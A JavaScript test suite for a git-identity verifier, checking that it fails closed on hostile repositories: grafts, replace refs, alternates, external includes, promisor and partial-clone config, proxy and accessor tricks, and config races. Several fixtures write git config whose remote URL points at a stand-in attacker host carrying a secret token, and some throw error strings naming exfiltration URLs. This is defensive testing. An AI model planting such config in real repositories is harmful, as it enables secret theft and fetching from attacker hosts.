import assert from 'node:assert/strict';
import { spawn as nodeSpawn } from 'node:child_process';
import { appendFileSync, writeFileSync } from 'node:fs';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { types as utilTypes } from 'node:util';
import test from 'node:test';

import {
  MAX_SEQUENCE,
  parseEvidenceDiscrepancyV1,
  parseVerifiedFactV1,
} from '../mcp/v3/evidence-bundle.mjs';
import {
  GIT_CLOSED_ENV,
  MAX_GIT_TOTAL_TIME_MS,
  parseGitIdentityRequestV1,
  verifyGitIdentityV1,
} from '../mcp/v3/git-identity.mjs';
import { RunContractV1Error } from '../mcp/v3/run-manifest.mjs';
import {
  countingProxy,
  createAbsoluteExternalIncludeRepo,
  createActiveIncludeIfRepo,
  createAlternatesRepo,
  createAnnotatedTagBranchRepo,
  createBenignIncludeRepo,
  createDetachedHeadRepo,
  createExternalGitdirRepo,
  createGraftsRepo,
  createHttpAlternatesRepo,
  createLinearRepo,
  createLinkedWorktreeBenignConfigRepo,
  createLinkedWorktreePromisorConfigRepo,
  createNonCommitHeadRepo,
  createPartialCloneConfigRepo,
  createPromisorPackRepo,
  createRelativeExternalIncludeRepo,
  createReplaceRefRepo,
  createRewrittenHistoryRepo,
  createStaleBaseRepo,
  createSymbolicRefDriftRepo,
  createSymlinkExternalIncludeRepo,
  createSymlinkGitdirRepo,
  createUnbornRepo,
  createUnreachableHeadRepo,
  createWrongMergeBaseRepo,
  trapTotal,
  validRequest,
} from './fixtures/r1-git-identity-fixtures.mjs';

function errorOf(action, expectedPath) {
  return Promise.resolve()
    .then(() => action())
    .then(
      () => assert.fail('expected a typed RunContractV1Error'),
      (error) => {
        assert.ok(error instanceof RunContractV1Error, `expected RunContractV1Error, got ${error}`);
        if (expectedPath !== undefined) assert.equal(error.path, expectedPath);
        return error;
      },
    );
}

function discrepancyIds(result) {
  return result.discrepancies.map((entry) => entry.discrepancy_id);
}

function assertContentFree(error, ...needles) {
  const blob = `${error.code}\n${error.path}\n${error.message}`;
  for (const needle of needles) {
    assert.equal(blob.includes(needle), false, needle);
  }
}

function isEffectiveConfigList(args) {
  return Array.isArray(args)
    && args.includes('config')
    && args.includes('--includes')
    && args.includes('--show-origin')
    && args.includes('--show-scope')
    && args.includes('-z');
}

function assertClosedProtocolEnv(env) {
  assert.equal(env, GIT_CLOSED_ENV);
  assert.equal(env.GIT_ALLOW_PROTOCOL, '');
  assert.equal(env.GIT_PROTOCOL_FROM_USER, '0');
  assert.equal(env.GIT_CONFIG_NOSYSTEM, '1');
  assert.equal(env.GIT_CONFIG_GLOBAL, '/dev/null');
  assert.equal(env.GIT_CONFIG_SYSTEM, '/dev/null');
  assert.equal(Object.hasOwn(env, 'GIT_CONFIG'), false);
  assert.equal(Object.hasOwn(env, 'GIT_CONFIG_COUNT'), false);
  assert.equal(Object.hasOwn(env, 'GIT_CONFIG_PARAMETERS'), false);
}

const HOSTILE_CONFIG_NEEDLES = [
  'attacker.example', 'SUPERSECRET', 'steal.git', 'blob:none',
  'WTSECRET', 'worktree.git', 'included.cfg', 'hostile.cfg',
];

test('live proxies are denied with zero traps on the request surface', async () => {
  const { proxy, counts } = countingProxy(validRequest({
    path: '/tmp/cce-r1-git-identity-repo',
    base_sha: 'a'.repeat(40),
    head_sha: 'b'.repeat(40),
  }));
  assert.equal((await errorOf(() => parseGitIdentityRequestV1(proxy))).code, 'proxy_denied');
  assert.equal(trapTotal(counts), 0);
  assert.equal((await errorOf(() => verifyGitIdentityV1(proxy))).code, 'proxy_denied');
});

test('revoked proxies fail closed before Array.isArray or Reflect can throw', async () => {
  const { proxy, revoke } = Proxy.revocable(validRequest({
    path: '/tmp/cce-r1-git-identity-repo',
    base_sha: 'a'.repeat(40),
    head_sha: 'b'.repeat(40),
  }), {
    get() { throw new Error('revoked get'); },
    ownKeys() { throw new Error('revoked ownKeys'); },
    getOwnPropertyDescriptor() { throw new Error('revoked descriptor'); },
  });
  revoke();
  assert.equal(utilTypes.isProxy(proxy), true);
  const error = await errorOf(() => parseGitIdentityRequestV1(proxy));
  assert.equal(error.code, 'proxy_denied');
  assert.throws(() => Array.isArray(proxy), TypeError);
});

test('accessor properties are rejected and their getters never run', async () => {
  let reads = 0;
  const input = validRequest({
    path: '/tmp/cce-r1-git-identity-repo',
    base_sha: 'a'.repeat(40),
    head_sha: 'b'.repeat(40),
  });
  Object.defineProperty(input, 'expected_base_ref', {
    enumerable: true,
    get() {
      reads += 1;
      return 'refs/heads/main';
    },
  });
  const error = await errorOf(() => parseGitIdentityRequestV1(input));
  assert.equal(error.code, 'accessor_property_denied');
  assert.equal(reads, 0);
});

test('detached, unborn, non-commit, and symbolic-ref drift fail closed', async (t) => {
  const detached = await createDetachedHeadRepo();
  t.after(() => detached.cleanup());
  assert.equal((await errorOf(() => verifyGitIdentityV1(validRequest({
    path: detached.path, base_sha: detached.baseSha, head_sha: detached.headSha,
  })))).code, 'detached_ref_denied');

  const unborn = await createUnbornRepo();
  t.after(() => unborn.cleanup());
  assert.equal((await errorOf(() => verifyGitIdentityV1(validRequest({
    path: unborn.path, base_sha: unborn.baseSha, head_sha: unborn.headSha,
  })))).code, 'unborn_ref_denied');

  const treeHead = await createNonCommitHeadRepo();
  t.after(() => treeHead.cleanup());
  assert.equal((await errorOf(() => verifyGitIdentityV1(validRequest({
    path: treeHead.path, base_sha: treeHead.baseSha, head_sha: treeHead.extra.treeSha,
  })))).code, 'non_commit_object');

  const drift = await createSymbolicRefDriftRepo();
  t.after(() => drift.cleanup());
  assert.equal((await errorOf(() => verifyGitIdentityV1(validRequest({
    path: drift.path,
    base_sha: drift.baseSha,
    head_sha: drift.headSha,
    expected_base_ref: 'refs/heads/alias',
  })))).code, 'symbolic_ref_drift');
});

test('replace refs and grafts fail closed as poisoned observations', async (t) => {
  const replaced = await createReplaceRefRepo();
  t.after(() => replaced.cleanup());
  assert.equal((await errorOf(() => verifyGitIdentityV1(validRequest({
    path: replaced.path, base_sha: replaced.baseSha, head_sha: replaced.headSha,
  })))).code, 'replace_refs_denied');

  const grafted = await createGraftsRepo();
  t.after(() => grafted.cleanup());
  assert.equal((await errorOf(() => verifyGitIdentityV1(validRequest({
    path: grafted.path, base_sha: grafted.baseSha, head_sha: grafted.headSha,
  })))).code, 'grafts_denied');
});

test('stale base history is parent-failing and records an integrity discrepancy', async (t) => {
  const repo = await createStaleBaseRepo();
  t.after(() => repo.cleanup());
  const result = await verifyGitIdentityV1(validRequest({
    path: repo.path, base_sha: repo.baseSha, head_sha: repo.headSha,
  }));
  assert.equal(result.status, 'failed');
  assert.equal(discrepancyIds(result).includes('stale-base'), true);
  assert.equal(result.observation.base_sha, repo.extra.currentBaseSha);
  assert.notEqual(result.observation.base_sha, repo.baseSha);
  assert.equal(result.facts[0].status, 'failed');
  assert.equal(result.facts[0].payload.base_sha, repo.baseSha);
  parseVerifiedFactV1(result.facts[0]);
  parseEvidenceDiscrepancyV1(result.discrepancies[0]);
});

test('rewritten history is parent-failing and does not verify ancestry', async (t) => {
  const repo = await createRewrittenHistoryRepo();
  t.after(() => repo.cleanup());
  const result = await verifyGitIdentityV1(validRequest({
    path: repo.path, base_sha: repo.baseSha, head_sha: repo.headSha,
  }));
  assert.equal(result.status, 'failed');
  const ids = discrepancyIds(result);
  assert.equal(ids.includes('rewritten-history'), true);
  assert.equal(result.observation.ancestor, false);
  assert.equal(result.facts[0].status, 'failed');
  parseVerifiedFactV1(result.facts[0]);
  parseVerifiedFactV1(result.facts[1]);
});

test('unsafe external gitdir, symlink gitdir, alternates, and promisor metadata fail closed', async (t) => {
  const external = await createExternalGitdirRepo();
  t.after(() => external.cleanup());
  const externalError = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: external.path, base_sha: external.baseSha, head_sha: external.headSha,
  })));
  assert.equal(externalError.code, 'repository_invalid');
  assertContentFree(externalError, external.path, external.extra.externalGit, 'hostile.git');

  const linkedSym = await createSymlinkGitdirRepo();
  t.after(() => linkedSym.cleanup());
  const symlinkError = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: linkedSym.path, base_sha: linkedSym.baseSha, head_sha: linkedSym.headSha,
  })));
  assert.equal(symlinkError.code, 'repository_invalid');
  assertContentFree(symlinkError, linkedSym.path, linkedSym.extra.externalGit);

  const alternates = await createAlternatesRepo();
  t.after(() => alternates.cleanup());
  const alternateOwn = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: alternates.path, base_sha: alternates.baseSha, head_sha: alternates.headSha,
  })));
  assert.equal(alternateOwn.code, 'config_influence_denied');
  assertContentFree(alternateOwn, alternates.path, alternates.extra.donorPath);
  const alternateForeign = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: alternates.path, base_sha: alternates.baseSha, head_sha: alternates.extra.donorHeadSha,
  })));
  assert.equal(alternateForeign.code, 'config_influence_denied');

  const httpAlternates = await createHttpAlternatesRepo();
  t.after(() => httpAlternates.cleanup());
  const httpError = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: httpAlternates.path, base_sha: httpAlternates.baseSha, head_sha: httpAlternates.headSha,
  })));
  assert.equal(httpError.code, 'config_influence_denied');
  assertContentFree(httpError, 'attacker.example', 'SUPERSECRET', 'http-alternates');

  const promisor = await createPromisorPackRepo();
  t.after(() => promisor.cleanup());
  const promisorError = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: promisor.path, base_sha: promisor.baseSha, head_sha: promisor.headSha,
  })));
  assert.equal(promisorError.code, 'config_influence_denied');
  assertContentFree(promisorError, 'pack-deadbeef', promisor.path);

  const partial = await createPartialCloneConfigRepo();
  t.after(() => partial.cleanup());
  const partialError = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: partial.path, base_sha: partial.baseSha, head_sha: partial.headSha,
  })));
  assert.equal(partialError.code, 'config_influence_denied');
  assertContentFree(partialError, 'attacker.example', 'steal.git', 'blob:none');
});

test('alternate object env is not inherited into a closed git observation', async (t) => {
  const donor = await createAlternatesRepo();
  t.after(() => donor.cleanup());
  const previous = process.env.GIT_ALTERNATE_OBJECT_DIRECTORIES;
  process.env.GIT_ALTERNATE_OBJECT_DIRECTORIES = `${donor.extra.donorPath}/.git/objects`;
  try {
    const error = await errorOf(() => verifyGitIdentityV1(validRequest({
      path: donor.path, base_sha: donor.baseSha, head_sha: donor.headSha,
    }), {
      spawn(command, args, options) {
        assert.equal(options.env, GIT_CLOSED_ENV);
        assert.equal(Object.hasOwn(options.env, 'GIT_ALTERNATE_OBJECT_DIRECTORIES'), false);
        assert.equal(Object.hasOwn(options.env, 'GIT_OBJECT_DIRECTORY'), false);
        return nodeSpawn(command, args, options);
      },
    }));
    assert.equal(error.code, 'config_influence_denied');
  } finally {
    if (previous === undefined) delete process.env.GIT_ALTERNATE_OBJECT_DIRECTORIES;
    else process.env.GIT_ALTERNATE_OBJECT_DIRECTORIES = previous;
  }
});

test('a forged branch ref pointing at an annotated tag is not accepted after peeling', async (t) => {
  const repo = await createAnnotatedTagBranchRepo();
  t.after(() => repo.cleanup());
  const error = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: repo.path, base_sha: repo.baseSha, head_sha: repo.headSha,
  })));
  assert.equal(error.code, 'non_commit_object');
  assertContentFree(error, repo.extra.tagSha, 'forged-base', repo.path);
});

test('injected child stream accessors and proxies fail closed without native errors', async (t) => {
  const repo = await createStaleBaseRepo();
  t.after(() => repo.cleanup());
  const request = validRequest({
    path: repo.path, base_sha: repo.baseSha, head_sha: repo.headSha,
  });

  function afterIdentity(hostileChild) {
    let calls = 0;
    return (command, args, options) => {
      calls += 1;
      if (calls === 1) return nodeSpawn(command, args, options);
      return hostileChild;
    };
  }

  const accessorError = await errorOf(() => verifyGitIdentityV1(request, {
    spawn: afterIdentity({
      stdout: {
        get on() { throw new Error('https://evil.example/steal?token=SECRET'); },
      },
      stderr: { on() { return this; } },
      kill() {},
      once() {},
    }),
  }));
  assert.equal(accessorError.code, 'git_execution_failed');
  assertContentFree(accessorError, 'SECRET', 'evil.example', 'steal');

  const stderrError = await errorOf(() => verifyGitIdentityV1(request, {
    spawn: afterIdentity({
      stdout: { on() { return this; } },
      stderr: {
        get on() { throw new Error('https://evil.example/stderr?token=SECRET'); },
      },
      kill() {},
      once() {},
    }),
  }));
  assert.equal(stderrError.code, 'git_execution_failed');
  assertContentFree(stderrError, 'SECRET', 'evil.example');

  const { proxy, revoke } = Proxy.revocable({
    stdout: { on() { return this; } },
    stderr: { on() { return this; } },
    kill() {},
    once() {},
  }, {
    get() { throw new Error('revoked child get'); },
    ownKeys() { throw new Error('revoked child ownKeys'); },
  });
  revoke();
  const revokedError = await errorOf(() => verifyGitIdentityV1(request, {
    spawn: afterIdentity(proxy),
  }));
  assert.equal(revokedError.code, 'proxy_denied');
  assert.equal(utilTypes.isProxy(proxy), true);

  const liveProxyError = await errorOf(() => verifyGitIdentityV1(request, {
    spawn: afterIdentity(new Proxy({
      stdout: { on() { return this; } },
      stderr: { on() { return this; } },
      kill() {},
      once() {},
    }, {
      get() { throw new Error('https://evil.example/proxy?token=SECRET'); },
    })),
  }));
  assert.equal(liveProxyError.code, 'proxy_denied');
  assertContentFree(liveProxyError, 'SECRET', 'evil.example');

  const chunkError = await errorOf(() => verifyGitIdentityV1(request, {
    spawn: afterIdentity((() => {
      const listeners = { data: [] };
      const stream = {
        on(event, handler) {
          if (event === 'data') listeners.data.push(handler);
          return this;
        },
      };
      return {
        stdout: stream,
        stderr: { on() { return this; } },
        kill() {},
        once(event, handler) {
          if (event === 'close') {
            queueMicrotask(() => {
              for (const onData of listeners.data) {
                onData({
                  get length() { throw new Error('https://evil.example/chunk?token=SECRET'); },
                });
                handler(0, null);
              }
            });
          }
          return this;
        },
      };
    })()),
  }));
  assert.equal(chunkError.code, 'git_execution_failed');
  assertContentFree(chunkError, 'SECRET', 'evil.example', 'chunk');
});

test('unknown, symbol, and accessor keys stay content-free typed failures', async () => {
  const base = validRequest({
    path: '/tmp/cce-r1-git-identity-repo',
    base_sha: 'a'.repeat(40),
    head_sha: 'b'.repeat(40),
  });
  const secretKey = 'https://attacker.example/callback?token=SUPERSECRET';
  const unknown = { ...base, [secretKey]: 'leak-me' };
  const unknownError = await errorOf(() => parseGitIdentityRequestV1(unknown));
  assert.equal(unknownError.code, 'unknown_key');
  assert.equal(unknownError.path, 'git_identity');
  assertContentFree(unknownError, 'SUPERSECRET', 'attacker.example', 'leak-me', secretKey);

  const nested = validRequest({
    path: '/tmp/cce-r1-git-identity-repo',
    base_sha: 'a'.repeat(40),
    head_sha: 'b'.repeat(40),
  });
  nested.repository = { ...nested.repository, [secretKey]: 'nested-leak' };
  const nestedError = await errorOf(() => parseGitIdentityRequestV1(nested));
  assert.equal(nestedError.code, 'unknown_key');
  assertContentFree(nestedError, 'SUPERSECRET', 'attacker.example', 'nested-leak');

  const symbolic = validRequest({
    path: '/tmp/cce-r1-git-identity-repo',
    base_sha: 'a'.repeat(40),
    head_sha: 'b'.repeat(40),
  });
  Object.defineProperty(symbolic, Symbol('https://attacker.example/symbol-secret'), {
    enumerable: true,
    value: 'symbol-leak',
  });
  const symbolError = await errorOf(() => parseGitIdentityRequestV1(symbolic));
  assert.equal(symbolError.code, 'symbol_key_denied');
  assertContentFree(symbolError, 'attacker.example', 'symbol-secret', 'symbol-leak');

  let reads = 0;
  const accessorUnknown = validRequest({
    path: '/tmp/cce-r1-git-identity-repo',
    base_sha: 'a'.repeat(40),
    head_sha: 'b'.repeat(40),
  });
  Object.defineProperty(accessorUnknown, secretKey, {
    enumerable: true,
    get() {
      reads += 1;
      return 'https://attacker.example/accessor';
    },
  });
  const accessorError = await errorOf(() => parseGitIdentityRequestV1(accessorUnknown));
  assert.equal(accessorError.code, 'unknown_key');
  assert.equal(reads, 0);
  assertContentFree(accessorError, 'SUPERSECRET', 'attacker.example');
});

test('end-to-end wall-clock bound rejects delayed verification after the deadline', async (t) => {
  const repo = await createStaleBaseRepo();
  t.after(() => repo.cleanup());
  const request = validRequest({
    path: repo.path, base_sha: repo.baseSha, head_sha: repo.headSha,
  });
  const realNow = Date.now;
  let calls = 0;
  Date.now = () => {
    calls += 1;
    return realNow();
  };
  t.after(() => { Date.now = realNow; });
  const counted = await verifyGitIdentityV1(request);
  assert.equal(counted.status, 'failed');
  const totalCalls = calls;
  assert.ok(totalCalls > 0);
  calls = 0;
  const origin = realNow();
  Date.now = () => {
    calls += 1;
    if (calls >= totalCalls) return origin + MAX_GIT_TOTAL_TIME_MS;
    return origin;
  };
  const error = await errorOf(() => verifyGitIdentityV1(request));
  assert.equal(error.code, 'bounds_exceeded');
  assertContentFree(error, repo.path);
});

test('sequence 65534 rewritten history saturates discrepancies without escaping', async (t) => {
  const repo = await createRewrittenHistoryRepo();
  t.after(() => repo.cleanup());
  const result = await verifyGitIdentityV1(validRequest({
    path: repo.path,
    base_sha: repo.baseSha,
    head_sha: repo.headSha,
    sequence: MAX_SEQUENCE - 1,
  }));
  assert.equal(result.status, 'failed');
  const ids = discrepancyIds(result);
  assert.equal(ids.includes('rewritten-history'), true);
  assert.ok(result.discrepancies.length >= 1);
  assert.ok(result.discrepancies.length <= 2);
  for (const discrepancy of result.discrepancies) {
    assert.ok(discrepancy.sequence <= MAX_SEQUENCE);
    parseEvidenceDiscrepancyV1(discrepancy);
  }
  assert.equal(result.facts[0].status, 'failed');
  assert.equal(result.facts[0].sequence, MAX_SEQUENCE - 1);
  assert.equal(result.facts[1].sequence, MAX_SEQUENCE);
  parseVerifiedFactV1(result.facts[0]);
  parseVerifiedFactV1(result.facts[1]);
});

test('unreachable heads and wrong merge bases fail closed with P13 discrepancies', async (t) => {
  const unreachable = await createUnreachableHeadRepo();
  t.after(() => unreachable.cleanup());
  const unreachableResult = await verifyGitIdentityV1(validRequest({
    path: unreachable.path, base_sha: unreachable.baseSha, head_sha: unreachable.headSha,
  }));
  assert.equal(unreachableResult.status, 'failed');
  assert.equal(discrepancyIds(unreachableResult).includes('unreachable-head'), true);
  assert.equal(unreachableResult.observation.ancestor, false);

  const diverged = await createWrongMergeBaseRepo();
  t.after(() => diverged.cleanup());
  const divergedResult = await verifyGitIdentityV1(validRequest({
    path: diverged.path, base_sha: diverged.baseSha, head_sha: diverged.headSha,
  }));
  assert.equal(divergedResult.status, 'failed');
  const ids = discrepancyIds(divergedResult);
  assert.equal(ids.includes('wrong-merge-base'), true);
  assert.equal(ids.includes('unreachable-head'), true);
  assert.notEqual(divergedResult.observation.merge_base_sha, diverged.baseSha);
  parseEvidenceDiscrepancyV1(divergedResult.discrepancies[0]);
});

test('absolute and relative external includes with prohibited keys fail closed', async (t) => {
  const absolute = await createAbsoluteExternalIncludeRepo();
  t.after(() => absolute.cleanup());
  const absoluteError = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: absolute.path, base_sha: absolute.baseSha, head_sha: absolute.headSha,
  })));
  assert.equal(absoluteError.code, 'config_influence_denied');
  assertContentFree(absoluteError, ...HOSTILE_CONFIG_NEEDLES, absolute.path, absolute.extra.includeFile);

  const relative = await createRelativeExternalIncludeRepo();
  t.after(() => relative.cleanup());
  const relativeError = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: relative.path, base_sha: relative.baseSha, head_sha: relative.headSha,
  })));
  assert.equal(relativeError.code, 'config_influence_denied');
  assertContentFree(
    relativeError, ...HOSTILE_CONFIG_NEEDLES, relative.path, relative.extra.includeFile, relative.extra.relative,
  );
});

test('an active includeIf condition with prohibited keys fails closed', async (t) => {
  const repo = await createActiveIncludeIfRepo();
  t.after(() => repo.cleanup());
  const error = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: repo.path, base_sha: repo.baseSha, head_sha: repo.headSha,
  })));
  assert.equal(error.code, 'config_influence_denied');
  assertContentFree(error, ...HOSTILE_CONFIG_NEEDLES, repo.path, repo.extra.includeFile, 'onbranch:main');
});

test('linked-worktree config.worktree provenance fails closed', async (t) => {
  const repo = await createLinkedWorktreePromisorConfigRepo();
  t.after(() => repo.cleanup());
  const error = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: repo.path, base_sha: repo.baseSha, head_sha: repo.headSha,
  })));
  assert.equal(error.code, 'config_influence_denied');
  assertContentFree(
    error, ...HOSTILE_CONFIG_NEEDLES, repo.path, repo.extra.mainPath, 'config.worktree', 'origin',
  );
});

test('a symlinked external include origin with prohibited keys fails closed', async (t) => {
  const repo = await createSymlinkExternalIncludeRepo();
  t.after(() => repo.cleanup());
  const error = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: repo.path, base_sha: repo.baseSha, head_sha: repo.headSha,
  })));
  assert.equal(error.code, 'config_influence_denied');
  assertContentFree(error, ...HOSTILE_CONFIG_NEEDLES, repo.path, repo.extra.includeFile, repo.extra.linkPath);
});

test('benign includes and safe linked worktrees still verify', async (t) => {
  const included = await createBenignIncludeRepo();
  t.after(() => included.cleanup());
  let configLists = 0;
  let commands = 0;
  const includedResult = await verifyGitIdentityV1(validRequest({
    path: included.path, base_sha: included.baseSha, head_sha: included.headSha,
  }), {
    spawn(command, args, options) {
      commands += 1;
      assertClosedProtocolEnv(options.env);
      if (isEffectiveConfigList(args)) configLists += 1;
      return nodeSpawn(command, args, options);
    },
  });
  assert.equal(includedResult.status, 'verified');
  assert.equal(configLists, 2);
  assert.ok(commands <= 20);
  assert.equal(includedResult.discrepancies.length, 0);

  const linked = await createLinkedWorktreeBenignConfigRepo();
  t.after(() => linked.cleanup());
  const linkedResult = await verifyGitIdentityV1(validRequest({
    path: linked.path, base_sha: linked.baseSha, head_sha: linked.headSha,
  }));
  assert.equal(linkedResult.status, 'verified');
  assert.equal(linkedResult.observation.head_sha, linked.headSha);
  assert.equal(linkedResult.discrepancies.length, 0);
});

test('system global and caller GIT_CONFIG surfaces cannot influence observation', async (t) => {
  const repo = await createLinearRepo();
  t.after(() => repo.cleanup());
  const hostileRoot = await mkdtemp(path.join(tmpdir(), 'p14-gitconfig-env-'));
  t.after(() => rm(hostileRoot, { recursive: true, force: true }));
  const hostileFile = path.join(hostileRoot, 'global.cfg');
  writeFileSync(hostileFile, `[extensions]
	partialClone = leaked-origin
[remote "leaked"]
	promisor = true
	partialclonefilter = blob:none
	url = https://attacker.example/leaked.git?token=SUPERSECRET
`);
  const previous = {
    GIT_CONFIG: process.env.GIT_CONFIG,
    GIT_CONFIG_GLOBAL: process.env.GIT_CONFIG_GLOBAL,
    GIT_CONFIG_SYSTEM: process.env.GIT_CONFIG_SYSTEM,
    GIT_CONFIG_NOSYSTEM: process.env.GIT_CONFIG_NOSYSTEM,
    GIT_CONFIG_COUNT: process.env.GIT_CONFIG_COUNT,
    GIT_CONFIG_PARAMETERS: process.env.GIT_CONFIG_PARAMETERS,
    GIT_CONFIG_KEY_0: process.env.GIT_CONFIG_KEY_0,
    GIT_CONFIG_VALUE_0: process.env.GIT_CONFIG_VALUE_0,
  };
  process.env.GIT_CONFIG = hostileFile;
  process.env.GIT_CONFIG_GLOBAL = hostileFile;
  process.env.GIT_CONFIG_SYSTEM = hostileFile;
  process.env.GIT_CONFIG_NOSYSTEM = '0';
  process.env.GIT_CONFIG_COUNT = '1';
  process.env.GIT_CONFIG_PARAMETERS = "'extensions.partialClone=origin'";
  process.env.GIT_CONFIG_KEY_0 = 'remote.origin.promisor';
  process.env.GIT_CONFIG_VALUE_0 = 'true';
  try {
    const result = await verifyGitIdentityV1(validRequest({
      path: repo.path, base_sha: repo.baseSha, head_sha: repo.headSha,
    }), {
      spawn(command, args, options) {
        assertClosedProtocolEnv(options.env);
        return nodeSpawn(command, args, options);
      },
    });
    assert.equal(result.status, 'verified');
  } finally {
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  }
});

test('protocol denial blocks a missing promisor object fetch', async (t) => {
  const repo = await createLinearRepo();
  t.after(() => repo.cleanup());
  const includeRoot = await mkdtemp(path.join(tmpdir(), 'p14-promisor-race-'));
  t.after(() => rm(includeRoot, { recursive: true, force: true }));
  const includeFile = path.join(includeRoot, 'hostile.cfg');
  writeFileSync(includeFile, `[extensions]
	partialClone = origin
[remote "origin"]
	url = https://attacker.example/steal.git?token=SUPERSECRET
	promisor = true
	partialclonefilter = blob:none
`);
  const missingSha = 'c'.repeat(40);
  let seenConfig = false;
  const error = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: repo.path, base_sha: repo.baseSha, head_sha: missingSha,
  }), {
    spawn(command, args, options) {
      assertClosedProtocolEnv(options.env);
      if (seenConfig) {
        appendFileSync(
          path.join(repo.path, '.git', 'config'),
          `\n[include]\n\tpath = ${includeFile}\n`,
        );
        seenConfig = false;
      }
      if (isEffectiveConfigList(args)) seenConfig = true;
      return nodeSpawn(command, args, options);
    },
  }));
  assert.ok(
    error.code === 'unreachable_head'
      || error.code === 'config_influence_denied'
      || error.code === 'git_execution_failed'
      || error.code === 'non_commit_object',
    error.code,
  );
  assert.notEqual(error.code, undefined);
  assertContentFree(error, ...HOSTILE_CONFIG_NEEDLES, includeFile, repo.path, missingSha);
});

test('config introduced between pre and post checks cannot verify', async (t) => {
  const repo = await createLinearRepo();
  t.after(() => repo.cleanup());
  const includeRoot = await mkdtemp(path.join(tmpdir(), 'p14-config-race-'));
  t.after(() => rm(includeRoot, { recursive: true, force: true }));
  const includeFile = path.join(includeRoot, 'hostile.cfg');
  writeFileSync(includeFile, `[extensions]
	partialClone = origin
[remote "origin"]
	url = https://attacker.example/steal.git?token=SUPERSECRET
	promisor = true
	partialclonefilter = blob:none
`);
  let seenPreConfig = false;
  let mutated = false;
  let configLists = 0;
  const error = await errorOf(() => verifyGitIdentityV1(validRequest({
    path: repo.path, base_sha: repo.baseSha, head_sha: repo.headSha,
  }), {
    spawn(command, args, options) {
      assertClosedProtocolEnv(options.env);
      if (seenPreConfig && !mutated) {
        mutated = true;
        appendFileSync(
          path.join(repo.path, '.git', 'config'),
          `\n[include]\n\tpath = ${includeFile}\n`,
        );
      }
      if (isEffectiveConfigList(args)) {
        configLists += 1;
        seenPreConfig = true;
      }
      return nodeSpawn(command, args, options);
    },
  }));
  assert.equal(error.code, 'config_influence_denied');
  assert.equal(configLists, 2);
  assert.equal(mutated, true);
  assertContentFree(error, ...HOSTILE_CONFIG_NEEDLES, includeFile, repo.path);
});
